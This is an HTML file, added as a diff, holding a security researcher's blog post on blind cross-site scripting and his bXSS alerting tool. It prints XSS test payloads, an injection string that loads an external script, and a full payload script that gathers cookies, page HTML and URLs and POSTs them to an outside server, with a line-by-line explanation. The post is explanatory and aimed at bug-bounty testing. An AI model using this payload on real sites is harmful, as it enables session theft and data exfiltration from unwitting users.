@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <!--Description-->
+    
+        <meta name="description" content="TL;DR – I re-invented the wheel with bXSS. 
+This idea started when I attended Mario Heiderich’s Exploiting Websites training at AppSec Europe, which i">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Lewis Ardern">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Ode To Blind XSS">
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="ardern.io">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>Ode To Blind XSS - ardern.io</title>
+
+    <!-- Tachyons Core CSS -->
+    <link rel="stylesheet" href="//unpkg.com/tachyons/css/tachyons.min.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<!-- Main Content -->
+<!-- Banner -->
+
+<!-- Banner -->
+<div class="w-100 bg-1 ph5-ns ph3 text-light">
+    
+    <nav class="db dt-l w-100 mw8 center border-box pv3">
+        <!-- <a class="db dtc-l v-mid link dim w-100 w-25-l tc tl-l mb2 mb0-l white" href="/" title="ardern.io">
+            <img src="" class="dib h3" alt="ardern.io">
+        </a>  -->
+        <a class="db dtc-l v-mid link dim w-100 w-25-l tc tl-l mb2 mb0-l white" href="/" title="ardern.io">      
+            ardern.io    
+        </a>
+        <div class="db dtc-l v-mid w-100 w-75-l tc tr-l">
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/" title="Home">
+                    Home
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/about" title="About">
+                    About
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/content" title="Content">
+                    Content
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/archives" title="Archives">
+                    Archives
+                </a>
+            
+        </div>
+    </nav>
+
+    <!-- Title -->
+    <div class="w-100 mw8 center vh-40 dt">
+        <div class="dtc v-mid white">
+            <h1 class="f1-l f2-m tc tc-m tl-ns">Ode To Blind XSS</h1>
+            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2017-12-10</p>
+        </div>
+    </div>
+
+    <!-- Icon -->
+    <div class="relative w-100 mw8 center white dn dn-m db-ns">
+        <i class="header-icon fa fa-unlock"></i>
+    </div>
+</div>
+
+
+    
+<!-- Content -->
+<div class="w-100 ph2 ph4-m ph5-l mv5 mv6-l">
+    <div class="content">
+        <div class="mw8 center">
+            <div class="cf">
+                <div class="fl w-100 w-70-l mw7 left fw3 lh-copy pr4-ns pr0-m post-content">
+                    <!-- Tags Vertical -->
+                    
+                        <div class="tags-container-vertical">
+                            <div class="tags-sub-container">
+                                <a class="fw3 ph1 dib" href="/tags/XSS/">#XSS</a> <a class="fw3 ph1 dib" href="/tags/Security/">#Security</a>
+                            </div>
+                        </div>
+                    
+
+                    <!-- Main Post Content -->
+                    <p>TL;DR – I re-invented the wheel with <a href="https://github.com/LewisArdern/bXSS" target="_blank" rel="noopener">bXSS</a>. </p>
+<p>This idea started when I attended <a href="https://twitter.com/0x6D6172696F" target="_blank" rel="noopener">Mario Heiderich’s</a> Exploiting Websites training at AppSec Europe, which is an absolutely fantastic training, you should check it out. Mario mentioned that his company <a href="https://cure53.de" target="_blank" rel="noopener">cure53</a> have a simple payload that they use for Blind Cross-Site-Scripting (XSS) <a href="https://cure53.de/m" target="_blank" rel="noopener">https://cure53.de/m</a> which I figured would be very useful to utilize for things like bug bounties. </p>
+<h2 id="Blind-XSS"><a href="#Blind-XSS" class="headerlink" title="Blind XSS"></a>Blind XSS</h2><p>So, what is Blind XSS Anyways? </p>
+<p>Blind XSS is what we call persisted/stored XSS which saves in some storage, such as a database and is executed when a ‘victim’ visits that page and the payload is rendered in the Document Object Model (DOM). The reason why it’s classed as blind is because it normally happens on functionality not normally exposed to a user, such as: </p>
+<ul>
+<li>Log viewers  </li>
+<li>Customer service portals </li>
+<li>Application functionality which requires a higher level of privilege </li>
+</ul>
+<p>If you think about it in general terms, when testing for Reflected or Stored XSS, the general payload would be something along the lines of: </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">"javascript:confirm(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span> </span><br><span class="line">L¢£n£Mñ]La¢£n</span><br></pre></td></tr></table></figure>
+<p>Testers try different payloads, getting some creative inspiration from <a href="https://html5sec.org" target="_blank" rel="noopener">html5sec</a> and try different ways to inject payloads, manipulating payloads through tools such as <a href="https://hackvertor.co.uk/" target="_blank" rel="noopener">Hackvector</a> or <a href="https://portswigger.net/burp/help/decoder" target="_blank" rel="noopener">Burp Decoder</a> to see if an application will render it within the DOM.</p>
+<p>With Blind XSS you need a way to get your payloads to inform you that it’s happened as it happens on a different server or page you can’t see. The easiest way is to load your JavaScript as a third-party resource such as:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"yoursite.com/xss.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>Now inject external resources, sit back, relax and wait to get a response.  </p>
+<p>You might be thinking, is this really necessary? If you take a look at sites such as <a href="hackerone.com">hackerone</a> or <a href="bugcrowd.com">bugcrowd</a>, you will start to see a common theme of these issues cropping up, and when the pay-outs are from anywhere a <a href="https://hackerone.com/reports/197337" target="_blank" rel="noopener">few hundred dollars</a> to <a href="https://hackerone.com/reports/159498" target="_blank" rel="noopener">$3000+</a> it makes sense to want create an automated way for testing Blind XSS. </p>
+<img src="/2017/12/10/blind-xss/blindxss.jpg">
+<h3 id="The-Payload"><a href="#The-Payload" class="headerlink" title="The Payload"></a>The Payload</h3><p>Using cure53’s example of a payload, you would inject the following payload where user-input can be inserted: </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cure53.de/m/"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Now to understand the script:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.name !== <span class="string">'__'</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123; dcoo = <span class="built_in">document</span>.cookie &#125; <span class="keyword">catch</span> (e) &#123; dcoo = <span class="literal">null</span> &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123; inne = <span class="built_in">document</span>.body.parentNode.innerHTML &#125; <span class="keyword">catch</span> (e) &#123; inne = <span class="literal">null</span> &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123; durl = <span class="built_in">document</span>.URL &#125; <span class="keyword">catch</span> (e) &#123; durl = <span class="literal">null</span> &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123; oloc = opener.location &#125; <span class="keyword">catch</span> (e) &#123; oloc = <span class="literal">null</span> &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123; oloh = opener.document.body.innerHTML &#125; <span class="keyword">catch</span> (e) &#123; oloh = <span class="literal">null</span> &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123; odoc = opener.document.cookie &#125; <span class="keyword">catch</span> (e) &#123; odoc = <span class="literal">null</span> &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> _ = <span class="built_in">document</span>.createElementNS(<span class="string">'http://www.w3.org/1999/xhtml'</span>, <span class="string">'form'</span>);</span><br><span class="line">        <span class="keyword">var</span> __ = <span class="built_in">document</span>.createElementNS(<span class="string">'http://www.w3.org/1999/xhtml'</span>, <span class="string">'input'</span>);</span><br><span class="line">        <span class="keyword">var</span> body = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        __.setAttribute(<span class="string">'value'</span>, <span class="built_in">escape</span>(</span><br><span class="line">            dcoo + <span class="string">'\r\n\r\n'</span> + inne + <span class="string">'\r\n\r\n'</span> + durl + <span class="string">'\r\n\r\n'</span> +</span><br><span class="line">            oloc + <span class="string">'\r\n\r\n'</span> + oloh + <span class="string">'\r\n\r\n'</span> + odoc</span><br><span class="line">        ));</span><br><span class="line">        __.setAttribute(<span class="string">'name'</span>, <span class="string">'_'</span>);</span><br><span class="line">        _.appendChild(__);</span><br><span class="line">        _.action = <span class="string">'https://cure53.de/m/'</span>;</span><br><span class="line">        _.method = <span class="string">'post'</span>;</span><br><span class="line">        <span class="comment">//_.target='_blank';</span></span><br><span class="line"></span><br><span class="line">        body.appendChild(_);</span><br><span class="line">        <span class="built_in">window</span>.name = <span class="string">'__'</span>;</span><br><span class="line">        _.submit();</span><br><span class="line">        <span class="comment">//history.back();</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="built_in">window</span>.name = <span class="string">''</span> &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li>The data is wrapped in an <a href="https://en.wikipedia.org/wiki/Immediately-invoked_function_expression" target="_blank" rel="noopener">Immediately-invoked function expression (IFFE)</a> so it’s going to execute on page load </li>
+<li>It captures attributes of the document if they exist  <ul>
+<li>cookies </li>
+<li>innerHTML </li>
+<li>URL</li>
+<li>location </li>
+</ul>
+</li>
+<li>Creates two elements through <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/createElementNS" target="_blank" rel="noopener">createElementNS</a><ul>
+<li>_ as a form</li>
+<li>__ as an input field</li>
+</ul>
+</li>
+<li>The body of the current window is captured as there’s generally one body in a HTML page, it’s getting the first instance [0] </li>
+<li>The document attributes are <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/escape" target="_blank" rel="noopener">escaped</a> and are set as the value of the input field </li>
+<li>The input field is appended to the form </li>
+<li>The form is assigned with an action to send the form to <a href="https://cure53.de/m/" target="_blank" rel="noopener">https://cure53.de/m/</a> as a POST request </li>
+<li>The form is attached to the current body of the DOM </li>
+<li>The form is submitted to <a href="https://cure53.de/m/" target="_blank" rel="noopener">https://cure53.de/m/</a> with the POST body of _ containing all of the attributes mentioned in step 2 if they exist </li>
+</ol>
+<p><a href="/2017/12/10/blind-xss/cure53.gif" target="_blank"><br>  <img src="/2017/12/10/blind-xss/cure53.gif"><br></a></p>
+<p>This script is pretty robust and will capture all attributes you really need to identify the target, if the HTTPOnly flag is not set you could potentially login to the application as the user which happened to visit the page where the payload was sitting in wait.  </p>
+<h3 id="Building-Time"><a href="#Building-Time" class="headerlink" title="Building Time"></a>Building Time</h3><p>Next was to create an application to process the data.</p>
+<p>By all means, this isn’t new, there’s lots of fantastic implementations that already exist; such as <a href="http://releases.portswigger.net/2016/01/1633.html" target="_blank" rel="noopener">Burp Collaborator</a>, <a href="https://xsshunter.com/features" target="_blank" rel="noopener">XSS Hunter</a>, <a href="https://github.com/Netflix/sleepy-puppy" target="_blank" rel="noopener">Sleepy Puppy</a>, and various other <a href="https://brutelogic.com.br/blog/blind-xss-code/" target="_blank" rel="noopener">examples</a>. </p>
+<p>What I saw in most of these examples is that they didn’t have SMS notifications set-up, so I created <a href="https://github.com/LewisArdern/bXSS" target="_blank" rel="noopener">bXSS</a> which does exactly that. </p>
+<p><a href="https://github.com/LewisArdern/bXSS" target="_blank" rel="noopener">bXSS</a> is a Node.js application which will: </p>
+<ul>
+<li>Email when the resource has been loaded via nodemailer (Using Gmail creds) </li>
+<li><a href="/2017/12/10/blind-xss/sms.jpg" target="_blank">Send a SMS via Twilio</a> </li>
+<li><a href="/2017/12/10/blind-xss/file.jpg" target="_blank">Save to disk to review later (If necessary)</a></li>
+</ul>
+<img src="/2017/12/10/blind-xss/email.jpg" title="Email Example">
+<p>The application has three core functions</p>
+<ul>
+<li>POST - /m (captures DOM information)  </li>
+<li>GET - /m (Loads the payload)</li>
+<li>Everything else - Loads alert(1)</li>
+</ul>
+<p>This is perfect for my needs, and maybe yours too; I would recommend looking at <a href="http://releases.portswigger.net/2016/01/1633.html" target="_blank" rel="noopener">Burp Collaborator</a>, <a href="https://github.com/Netflix/sleepy-puppy" target="_blank" rel="noopener">Sleepy Puppy</a>, or <a href="https://xsshunter.com/features" target="_blank" rel="noopener">XSS Hunter</a> to see if they are appropriate as they are extremly easy to get started with. Every security tester has a copy of Burp Suite which has built-in Blind XSS detection, and XSS Hunter’s online version is simple to use. </p>
+<p>If you like the project, feel free to contribute or if you want to suggest improvements fire them over at <a href="https://github.com/LewisArdern/bXSS/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<p>And finally a big (H/T) to <a href="https://twitter.com/vnought" target="_blank" rel="noopener">Henrik Lissner</a> for his coding wisdom.</p>
+
+                    
+                    <!-- Tags Bottom -->
+                    
+                        <div class="tags-container-bottom">
+                            <i class="fa fa-tag pr3 text-main-color"></i><a class="fw3 ph1 dib" href="/tags/XSS/">#XSS</a> <a class="fw3 ph1 dib" href="/tags/Security/">#Security</a>
+                        </div>
+                    
+
+                    <!-- Comments -->
+                    
+<div id="disqus_thread" class="mt5">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+
+
+
+                </div>
+                <div class="fl w-100 w-30-l center fw3 lh-copy pl4-ns tl black-50">
+                    
+                    <hr class="dn-l mw4 black-50 mt5">
+                    
+                    <!-- Widget 1: About -->
+                    <div class="mt5 mt0-l">
+    <article class="dt db-l mw8 mw8-m mw5-ns center ml0-l bg-white mv3">
+        <div class="dn dtc-m db-l v-mid tc pr4 pr0-l" style="min-width: 6rem;">
+            <img src="https://pbs.twimg.com/profile_images/877900659319853056/iaUa6_XV_400x400.jpg" class="mb4-l br-100 h3 w3 h4-l w4-l dib" title="Lewis Ardern">
+        </div>
+        <div style="color:#7C8999" class="dtc db-l v-mid lh-copy measure center f6 -50 tj">
+            Hello, I am Lewis Ardern, pictured above. I work as a Security Consultant with a strong focus on Web Security. <br>Currently based and working in London.
+        </div>
+    </article>
+</div>
+
+                    <hr class="dn-l mw4 black-50 mt5">
+                    
+                    <!-- Widget 2: Categories -->
+                    
+
+                    <!-- Widget 3: Recent Posts -->
+                    <div class="mt5 tc tl-l">
+    <h3>Recent Posts</h3>
+    
+        <p>
+            <a href="/2018/12/07/angularjs-bxss/">Blind XSS AngularJS Payloads</a>
+        </p>
+    
+        <p>
+            <a href="/2018/02/23/Apple-XSS/">Planet Of The XSS</a>
+        </p>
+    
+        <p>
+            <a href="/2017/12/10/blind-xss/">Ode To Blind XSS</a>
+        </p>
+    
+</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- Footer -->
+<div class="bg-1 ph2 ph5-ns pv5">
+        <div class="mv8">
+            <div class="center tc">
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://twitter.com/LewisArdern" target="_blank">
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://github.com/LewisArdern" target="_blank">
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="mailto:lewis@ardern.io" target="_blank">
+                            <i class="fa fa-envelope"></i>
+                        </a>
+                    </div>
+                
+            </div>
+            <div class="f6 f5-ns center tc white pt5 fw3">
+                ardern.io ~ © 2018  <!--anodyne theme-->
+            </div>
+        </div>
+    </div>
+
+<!-- After Footer -->
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'ardernio';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+</body>
+
+</html>
